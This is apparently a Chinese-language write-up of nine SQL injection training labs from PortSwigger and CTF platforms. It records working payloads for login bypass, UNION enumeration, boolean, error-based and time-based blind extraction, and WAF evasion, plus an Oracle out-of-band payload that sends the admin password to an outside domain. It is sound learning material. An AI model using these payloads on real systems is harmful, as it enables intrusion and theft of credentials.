# SQL 注入 · 四个 Lab 通关记录

> 记录我在 PortSwigger 上打过的四个 SQL 注入 lab：
> 目标、关键 payload、遇到什么问题。
> 具体卡点分析见 `03-卡点复盘.md`。

---

## Lab 1：SQL 注入漏洞，允许登录绕过

| 项目 | 内容 |
|---|---|
| **难度** | Apprentice |
| **数据库** | MySQL |
| **技术** | 认证绕过（注释掉密码检查） |
| **目标** | 以 administrator 身份登录 |

### 关键 payload

```
username: administrator'--
password: 任意
```

### 拼出来的 SQL

```sql
SELECT * FROM users
WHERE username='administrator'--' AND password='任意'
                              └── 从这里开始全被注释
```

**等价于：**

```sql
SELECT * FROM users WHERE username='administrator'
```

**密码检查条件被完全删掉了。**

### 成功标志

```http
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=xxxxxxxx
```

**我当时以为 302 是失败，其实是成功。** 详见卡点 1。

### 学到的东西

- `--` 注释符的用法
- **302 + Set-Cookie = 登录成功**，不是错误
- 跟着 Location 走，用**新发的** session

---

## Lab 2：SQL 注入攻击，列出非 Oracle 数据库的内容

| 项目 | 内容 |
|---|---|
| **难度** | Apprentice |
| **数据库** | PostgreSQL |
| **技术** | UNION 联合查询 |
| **目标** | 拿到 administrator 的密码 |

### 完整流程

#### ① 判断列数

```sql
/filter?category=Gifts' ORDER BY 3--
```

**3 列正常、4 列报错 → 原查询 3 列。**

#### ② 找回显列

```sql
/filter?category=Gifts' UNION SELECT 'a','b','c'--
```

**页面出现这些字母的位置就是回显列。**

#### ③ 列出所有表名

```sql
/filter?category=Gifts' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

**结果里混着一大堆系统表（`pg_*`、`information_schema` 的视图），真正有用的是带随机后缀的那个：**

```
users_yrlaxw    ← 这个
```

> **怎么一眼认出来：** 系统表都以 `pg_` 开头，业务表通常带随机后缀。

#### ④ 列出该表的列名

```sql
/filter?category=Gifts' UNION SELECT column_name,NULL,NULL
  FROM information_schema.columns
  WHERE table_name='users_yrlaxw'--
```

**得到：**

```
username_zigghx
password_hpzjqx
```

#### ⑤ 读数据

```sql
/filter?category=Gifts' UNION SELECT username_zigghx||'~'||password_hpzjqx,NULL,NULL
  FROM users_yrlaxw--
```

**页面显示：**

```
administrator~s3cr3t_p4ssw0rd
carlos~hunter2
```

#### ⑥ 提交 administrator 的密码

### 遇到的两个坑

| 坑 | 详细 |
|---|---|
| **全角逗号** | `username_zigghx，password_hpzjqx` 里的 `，` 是中文标点 → 语法错误 |
| 表名列名有随机后缀 | 抄的时候容易漏字符 |

详见卡点 2。

### 学到的东西

- `information_schema.tables` / `.columns` 的用法
- **PostgreSQL 用 `||` 拼接**，不是 `+`
- 全角/半角标点问题（这个坑很隐蔽）

---

## Lab 3：盲 SQL 注入，利用条件响应

| 项目 | 内容 |
|---|---|
| **难度** | Practitioner |
| **数据库** | PostgreSQL |
| **技术** | 布尔盲注（条件响应） |
| **目标** | 拿到 administrator 的密码 |

### 原理

应用用 TrackingId cookie 拼进查询：

```sql
SELECT * FROM tracking WHERE TrackingId = '【cookie 值】'
```

**如果查询返回行，页面显示 "Welcome back"。**

**所以「Welcome back」的有无 = 你的条件真假。**

### 关键 payload

#### ① 通道验证

```sql
' AND '1'='1        →  显示 Welcome back   ← 真
' AND '1'='2        →  不显示              ← 假
```

#### ② 确认表 / 用户

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

#### ③ 测长度

```sql
' AND LENGTH((SELECT password FROM users WHERE username='administrator'))>1
```

**递增 `>1`、`>2`…… 直到不再显示 Welcome back，临界值就是长度（本实例是 20）。**

#### ④ 取字符

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
```

**逐字符试，或者用 ASCII 二分。**

### 遇到的坑

| 坑 | 说明 |
|---|---|
| **用 `>'z'` 测试** | ASCII 里几乎没有字符大于 `'z'`，永远为假 → 以为注入失败 |
| `;` 结尾 | 语法错误 |
| `--` 没加 / 没空格 | 收尾引号悬空 |
| 手工一位一位试太慢 | 720 次跑不完 |

详见卡点 6、4、5、15。

### 解决方式

**写了 本目录下的 `blind_sqli.py`：**
- 36 个字符并发测试
- 20 位 × 36 = 720 请求，多线程几秒跑完

---

## Lab 4：盲 SQL 注入，利用条件错误

| 项目 | 内容 |
|---|---|
| **难度** | Practitioner |
| **数据库** | **Oracle** |
| **技术** | 布尔盲注（条件错误） |
| **目标** | 拿到 administrator 的密码 |

### 原理

**页面内容没差异，但错误时返回 HTTP 500。**

用 `CASE` 制造「条件成立就除零」：

```sql
CASE WHEN 条件 THEN TO_CHAR(1/0)   -- 真 → 除零 → 500
             ELSE 'a' END          -- 假 → 正常 → 200
```

**⚠️ 逻辑是反的：报错 = 条件为真。**

### 关键 payload

#### ① 通道验证（Oracle 版）

```sql
' AND (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--   → 必须 500
' AND (SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--   → 必须 200
```

#### ② 测长度

```sql
'and(select case when(length(password)>20)
      then to_char(1/0) else 'a' end
      from users where username='administrator')='a'--
```

#### ③ 取字符（ASCII 二分）

```sql
'and(select case when(
   ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1))>77
 ) then to_char(1/0) else 'a' end from dual)='a'--
```

**注意这里是 `FROM dual`** —— 因为子查询里用的是**另一个子查询**（`SELECT password FROM users ...`）返回的标量，不再直接引用 users 的列。

#### ④ 提交密码登录

### 遇到的坑（这个 lab 踩得最多）

| 坑 | 现象 | 正确做法 |
|---|---|---|
| **`FROM dual` 引用 users 的列** | 永远 500 | 改 `FROM users WHERE username='administrator'` |
| **`when(` 括号没闭合** | 永远 500 | 补 `)` 或不用括号 |
| **`else a'` 缺开引号** | 永远 500 | `else 'a'` |
| **`then 1/0` 类型不匹配** | 永远 500 | Oracle 必须 `TO_CHAR(1/0)` |
| **`SUBSTRING`** | 永远 500 | Oracle 用 `SUBSTR` |
| **分不清语法错误 vs 条件错误** | 1=1 和 1=2 都 500 | 先做 `1=1`/`1=2` 对照 |
| **lab 过期** | 504 | 重启 lab,更新 URL/TrackingId/长度 |

详见卡点 7、8、9、10、11、12、13。

### 解决方式

**写了 本目录下的 `blind_sqli_error.py`：**
- ASCII 二分（避开 Oracle 排序规则）
- 20 位 × 7 次 ≈ 140 请求
- 带通道自检（1=1 / 1=2），不通就退出

---

## Lab 5：基于可见错误的 SQL 注入

| 项目 | 内容 |
|---|---|
| **难度** | Practitioner |
| **数据库** | PostgreSQL |
| **技术** | 报错带数据（cast to int） |
| **目标** | 拿到 administrator 的密码 |

### 原理

**应用把数据库报错原文显示在页面上。**

```
Unterminated string literal started at position 52
in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

**这条报错直接暴露了查询结构、表名、注入点类型。**

### 关键 payload

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**执行后报错:**

```
invalid input syntax for type integer: "s3cr3t_p4ssw0rd"
                                        └─────┬─────┘
                                            密码
```

### 过程中踩的坑

| 坑 | 详细 |
|---|---|
| `AND` 直接接 `CAST` → 类型错误 | 要写 `1=CAST(...)` |
| 表名列名抄错 | 用 `LIMIT 1` 代替长 `WHERE` |
| **payload 太长被截断** | 报错位置落在字符串中间,删掉 tracking id 腾空间 |
| 分不清语法错 vs 条件错 | 先跑 `1=1` / `1=2` 对照 |
| lab 过期 | 504 |

详见卡点 23、24、11、12。

### 学到的东西

- **报错本身就是数据通道**
- 报错里的 `position N` 能定位截断点
- cookie 有长度上限,payload 要精简

---

## Lab 6：盲 SQL 注入，利用时间延迟（含信息提取）

| 项目 | 内容 |
|---|---|
| **难度** | Practitioner |
| **数据库** | PostgreSQL |
| **技术** | 时间盲注 + 二分 |
| **目标** | 拿到 administrator 的密码 |

### 原理

```sql
x';select case when (条件) then pg_sleep(5) else pg_sleep(0) end--
```

**条件为真 → 睡 5 秒 → 响应慢;条件为假 → 立刻返回。**

### 关键 payload

**① 通道验证**

```
x';select pg_sleep(5)--
```

**② CASE 恒真/恒假**

```
x';select case when (1=1) then pg_sleep(5) else pg_sleep(0) end--
x';select case when (1=2) then pg_sleep(5) else pg_sleep(0) end--
```

**③ 测长度**

```sql
x';select case when (length(password)>20) then pg_sleep(5) else pg_sleep(0) end from users--
```

**④ 取字符（二分）**

```sql
x';select case when (substring(password,1,1)>'m') then pg_sleep(5) else pg_sleep(0) end from users--
```

**注意:表单里的 `;` 要写成 `%3B`,空格写成 `+`。**

### 过程中踩的坑

| 坑 | 详细 |
|---|---|
| **用了 MSSQL 的 `IF`** | PostgreSQL 必须用 `CASE` |
| `ELSE 0` 类型不匹配 | 要写 `pg_sleep(0)` |
| cookie 里 `;` 没编码 | 必须 `%3B` |
| 阈值写死 3.5 秒 | 要按基准延迟算 |
| 手工逐字符试太慢 | 二分 + 脚本 |
| 脚本并发 | 时间盲注必须串行 |

详见卡点 16、17、18、19、21。

### 解决方式

**脚本:`blind_sqli_time.py` / `blind_sqli_time_v3.py` / `time_blind_generic.py`**

---

## Lab 7：带外（OOB）SQL 注入

| 项目 | 内容 |
|---|---|
| **难度** | Practitioner |
| **数据库** | Oracle |
| **技术** | 带外（DNS 外带） |
| **目标** | 触发交互 / 外带密码 |

### 原理

**让 Oracle 解析带外部实体的 XML,从而发起 HTTP 请求:**

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://你的域名/">
    %remote;]>'),'/l') FROM dual--
```

**外带数据时,把查询拼进域名:**

```sql
... SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.你的域名/"
```

### 关键点

| 点 | 说明 |
|---|---|
| `xmltype` | 解析 XML → 外部实体 → 发请求 |
| `EXTRACTVALUE` | 让表达式有返回值,**真正干活的是 xmltype** |
| **不需要特权** | 普通数据库用户就能用 |
| 编码 | `%`→`%25`(最先)、空格→`+`、`"`→`%22`、`;`→`%3B` |

### 过程中的坑

| 坑 | 详细 |
|---|---|
| **Community 没有 Collaborator** | 官方功能划分,只能换平台 |
| interactsh 国内不可达 | 换 `dnslog.cn` |
| 第三方平台不会让 lab Solved | PortSwigger 只认自家 Collaborator |
| `%` 没编码 | payload 语法错,收不到请求 |
| 表名大小写 | Oracle 里试 `USERS` |

详见卡点 25、26、27、28。

### 完整资料

**见 `06-OOB带外注入.md`。**

---

## Lab 8：[极客大挑战 2019]LoveSQL（真实平台题）

| 项目 | 内容 |
|---|---|
| **平台** | CTF²（DASCTF） |
| **数据库** | MySQL |
| **技术** | 登录绕过 + UNION 注入 |
| **目标** | 拿到 `CTF2{...}` |

> 这是第一道**真实 CTF 平台**题，和 PortSwigger 的 lab 形成对照：
> 环境不干净、有前置校验、有各种 HTTP 层陷阱。

### 完整链条（全部实测）

**① 万能密码**

```http
GET /check.php?username=admin'%23&password=1
```

→ `Login Success! Hello admin！ Your password is '2396e6842fdead1731c2860562b9f6a4'`

**注意:`password` 不能为空**（空了会命中前置校验，见坑 29）。

**② 判列数**

```
admin' order by 3%23      → 正常
admin' order by 4%23      → Unknown column '4' in 'order clause'
```

→ **3 列**

**③ 找回显位**

```
-1' union select 1,2,3%23
```

→ `Hello 2！ Your password is '3'`

**页面模板:`Hello <第2列>！ Your password is '<第3列>'`**

**④ 库名**

```
-1' union select 1,database(),user()%23
```

→ `geek` / `root@localhost`

**⑤ 表名**

```
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23
```

→ `geekuser,l0ve1ysq1`

**⑥ 字段名**

```
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23
```

→ `id,username,password`

**⑦ 拖数据**

```
-1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23
```

→ 16 行，最后一行 `16flagCTF2{a953cdd8-253b-4081-9732-9b754069391e}`

**⑧ 单独取 flag**

```
-1' union select 1,2,password from l0ve1ysq1 where username='flag'%23
```

→ **`CTF2{a953cdd8-253b-4081-9732-9b754069391e}`**

### 这题踩的三个坑（真实平台特有）

| 坑 | 现象 | 原因 |
|---|---|---|
| **空密码** | 545 "Input your username and password" | `empty($password)` 前置校验 |
| **`#` 未编码** | 同样 545 | `#` 是 URL 锚点，`&password=` 被丢掉 |
| **`1'#`** | 548 "NO,Wrong username password" | 没有叫 `1` 的用户 |

详见卡点 29、30、31。

### 和 PortSwigger lab 的差别

| | PortSwigger | 真实 CTF 平台 |
|---|---|---|
| 参数校验 | 基本没有 | **有非空/格式校验** |
| HTTP 层陷阱 | 少 | **`#`、`;`、空格都要留意** |
| 页面回显 | 明确的 "Welcome back" | 要看响应长度/文案变化 |
| 数据量 | 1 行 | **十几行，要 `group_concat`** |

### 学到的

- **登录成功 ≠ 拿到 flag** —— 登录只是证明注入存在
- **`-1'` 是 UNION 的标准起手式**（让原查询查空）
- **响应长度是判断依据**（545 / 548 / 813 三种状态）
- **真实平台先看 HTTP 层，再看 SQL 层**

---

## Lab 9：[极客大挑战 2019]HardSQL（WAF + 报错注入）

| 项目 | 内容 |
|---|---|
| **平台** | CTF²（DASCTF） |
| **数据库** | MySQL / MariaDB |
| **技术** | **extractvalue 报错注入** |
| **难点** | **有 WAF，空格 / `and` / `=` / `substr` 全被拦** |

> 这题和 Lab 8 是同一个登录框，但**加了 WAF**。
> 打法和 Lab 8 完全不同：union 用不了，只能报错注入。

### 第一步：先测「报错会不会显示」

```
password=2'or(
```

→ `Error! You have an error in your SQL syntax; check the manual that corresponds to
  your MariaDB server version...`

**看到 MySQL 报错原文 → 报错注入可行，不用做盲注。**

这一步只要 5 秒，但决定了后面用哪套打法。

### 第二步：fuzz 出 WAF 规则

**三种响应长度，对应三种状态：**

| 响应 | 长度 | 含义 |
|---|---|---|
| `Login Success!!` | 550 | 条件为真 |
| `NO,Wrong username password` | 564 | 条件为假 |
| **`你可别被我逮住了，臭弟弟`** | **531** | **WAF 拦截** |

**实测规则：**

| ⛔ 被拦 | ✅ 放行 |
|---|---|
| **空格** / TAB / LF / CR / FF | **`or`** |
| **`and`**（大小写都拦） | `(` `)` |
| **`=` `>` `<`** | **`like` / `regexp`** |
| **`substr` / `substring` / `mid`** | **`left` / `right`** |
| `union` | `select` |
| `\|\|` `&&` | `#` |
| `/**/` | `group_concat` |
| `count(*)` | `from(` |

**字典见 `sqli-fuzz-payloads.txt`，可直接喂 Burp Intruder。**

### 第三步：库名

```
2'or(extractvalue(1,concat(0x7e,(select(database())))))#
```

→ `Error! XPATH syntax error: '~geek'`

**`0x7e` 就是 `~`，给数据加标记，方便从报错里截。**

**注意：整条 payload 没有空格、没有 `=`、没有 `and`。**

### 第四步：表名（用函数过滤，绕开空格和 `=`）

**标准写法 `where table_schema='geek'` 有两个雷：空格 + `=`。**

**改用 `instr()` 当条件：**

```
2'or(extractvalue(1,concat(0x7e,(select(left(group_concat(table_name),32))from(information_schema.tables)where(instr(table_schema,'geek'))))))#
```

→ `~H4rDsq1`

**`where(instr(table_schema,'geek'))` —— 函数返回非 0 即真，天然是个布尔条件。**

### 第五步：数据（分片）

```
2'or(extractvalue(1,concat(0x7e,(select(left(group_concat(password),31))from(H4rDsq1)))))#
```

→ `~CTF2{461c1496-eec5-4e07-b12a-94`

**XPATH 报错一次只显示 31 个数据字符**（`~` 占掉 1 个）。

**分片公式：**

```sql
left(x,31)                    -- 第 1~31
right(left(x,62),31)          -- 第 32~62
right(left(x,93),31)          -- 第 63~93
```

### 验证

```
length(group_concat(password)) → 42
left(...,5)                    → CTF2{
right(...,11)                  → 18e11e5b6d}
```

**长度 42 + 首尾都对上 → 拼出完整 flag：**

```
CTF2{461c1496-eec5-4e07-b12a-9418e11e5b6d}
```

### 这题踩的坑

| 坑 | 现象 | 解决 |
|---|---|---|
| **空格被拦** | 531 WAF 页 | 用 `(` `)` 分词,**完全不写空格** |
| **`and` 被拦** | 531 | 换 `or` |
| **`=` 被拦** | 531 | 换 `like` / 用 `instr()` |
| **`substr` 被拦** | 531 | 换 `left` / `right` |
| **`/**/` 也被拦** | 531 | 注释代替空格这条路彻底死 |
| **`count(*)` 被拦** | 531 | 换 `group_concat()` |
| **XPATH 只显示 31 字符** | 数据被截断 | `right(left(x,N),31)` 分片 |
| **`limit(1)` 语法错** | SQL 错 | 用聚合函数 `group_concat` 压成一行 |

### 为什么工具在这题一定不行

| 工具行为 | 结果 |
|---|---|
| sqlmap 发 `' AND 1=1--` | 空格 + `and` → WAF |
| `--tamper=space2comment` | `/**/` 也被拦 |
| 枚举用 `from information_schema` | 空格 → WAF |
| **手工 4 条请求** | ✅ **直接出 flag** |

**报错注入 4 条请求 vs 工具几千条 —— 这题是手工的天花板。**

### 学到的

- **先测报错回显**：5 秒决定后面用报错还是盲注
- **WAF 拦的是「标准写法」**，不是 SQL 本身
- **`(` 是天然分词符**，不需要空格
- **函数有等价替代**：`substr`→`left/right`、`=`→`like`、`count(*)`→`group_concat`
- **报错注入 = 一次 31 字符**，比布尔盲注快一个数量级

---

## 九个 Lab 的技术对比

| Lab | 数据库 | 技术 | 判断依据 | 关键函数 |
|---|---|---|---|---|
| 1 登录绕过 | MySQL | 注释绕过 | 302 + Set-Cookie | `--` |
| 2 列出内容 | PostgreSQL | UNION | 页面回显 | `information_schema`、`\|\|` |
| 3 条件响应 | PostgreSQL | 布尔盲注 | "Welcome back" | `SUBSTRING`、`LENGTH` |
| 4 条件错误 | **Oracle** | 布尔盲注 | **500 / 200** | `SUBSTR`、`TO_CHAR(1/0)`、`dual` |
| 5 可见错误 | PostgreSQL | 报错带数据 | **报错文本** | `CAST(... AS int)` |
| 6 时间延迟 | PostgreSQL | 时间盲注 | **响应耗时** | `pg_sleep`、`CASE` |
| 7 带外 | **Oracle** | OOB | **DNS 平台记录** | `xmltype`、`EXTRACTVALUE` |
| 8 LoveSQL | MySQL | 登录绕过 + UNION | **响应长度 545/548/813** | `group_concat`、`%23` |
| 9 HardSQL | MySQL | **WAF + 报错注入** | **531 WAF / 789 错** | `extractvalue`、`left`、`instr` |

## 一句话总结

> **同一个漏洞，九种打法。**
> UNION 最快，盲注最慢，OOB 最隐蔽。
> **盲注的全部精髓是：把「取数据」变成「回答是/否」，然后二分。**
> **回显一路收窄：内容 → 状态码 → 耗时 → 外带。**
> **真实平台还要多一层：先过 HTTP 层（`%23`/`%3B`/非空校验），再谈 SQL。**
> **有 WAF 时先 fuzz 规则：被拦的词全都能换等价写法。**
